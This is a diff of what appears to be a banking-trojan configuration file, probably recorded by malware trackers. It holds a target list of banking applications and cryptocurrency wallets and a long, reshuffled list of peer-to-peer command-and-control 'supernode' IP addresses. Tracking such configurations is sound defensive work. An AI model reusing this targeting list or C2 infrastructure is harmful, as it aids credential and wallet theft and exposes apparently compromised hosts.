@@ -33,10 +33,10 @@
     </module>
   </modules>
   <commands>
-    <cmd id="989550" type="15">
+    <cmd id="1006669" type="15">
       <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
     </cmd>
-    <cmd id="989551" type="22">
+    <cmd id="1006671" type="22">
       <fs/>
     </cmd>
   </commands>
@@ -243,7 +243,11 @@
   </c2>
   <supernodes>
     <node>
-      <ip>46.208.1.95</ip>
+      <ip>51.52.205.221</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>151.228.203.95</ip>
       <port>443</port>
     </node>
     <node>
@@ -251,15 +255,15 @@
       <port>443</port>
     </node>
     <node>
-      <ip>51.52.205.221</ip>
+      <ip>216.14.144.190</ip>
       <port>443</port>
     </node>
     <node>
-      <ip>73.139.14.232</ip>
+      <ip>92.237.177.28</ip>
       <port>443</port>
     </node>
     <node>
-      <ip>70.34.11.145</ip>
+      <ip>98.145.188.243</ip>
       <port>443</port>
     </node>
     <node>
@@ -267,23 +271,35 @@
       <port>443</port>
     </node>
     <node>
-      <ip>87.114.93.29</ip>
-      <port>8443</port>
-    </node>
-    <node>
-      <ip>81.133.199.158</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>212.159.160.208</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>185.236.77.228</ip>
+      <ip>46.208.1.95</ip>
       <port>443</port>
     </node>
     <node>
       <ip>89.242.6.199</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>70.34.13.206</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>73.139.14.232</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>87.114.93.29</ip>
+      <port>8443</port>
+    </node>
+    <node>
+      <ip>82.9.114.19</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>80.2.118.90</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>81.133.199.158</ip>
       <port>443</port>
     </node>
     <node>
@@ -295,19 +311,47 @@
       <port>443</port>
     </node>
     <node>
+      <ip>82.27.58.162</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>185.236.77.228</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>24.234.234.212</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>184.183.29.147</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>82.38.157.232</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>77.102.48.202</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>95.208.30.243</ip>
+      <port>443</port>
+    </node>
+    <node>
       <ip>69.14.75.158</ip>
       <port>443</port>
     </node>
     <node>
-      <ip>82.9.114.19</ip>
+      <ip>212.159.160.208</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>92.27.84.44</ip>
       <port>443</port>
     </node>
     <node>
       <ip>86.147.22.101</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>82.27.58.162</ip>
       <port>443</port>
     </node>
     <node>
@@ -340,10 +384,6 @@
     </node>
     <node>
       <ip>82.26.59.237</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>137.99.236.149</ip>
       <port>443</port>
     </node>
     <node>
@@ -387,7 +427,7 @@
       <port>443</port>
     </node>
     <node>
-      <ip>92.27.84.44</ip>
+      <ip>90.208.80.182</ip>
       <port>443</port>
     </node>
   </supernodes>
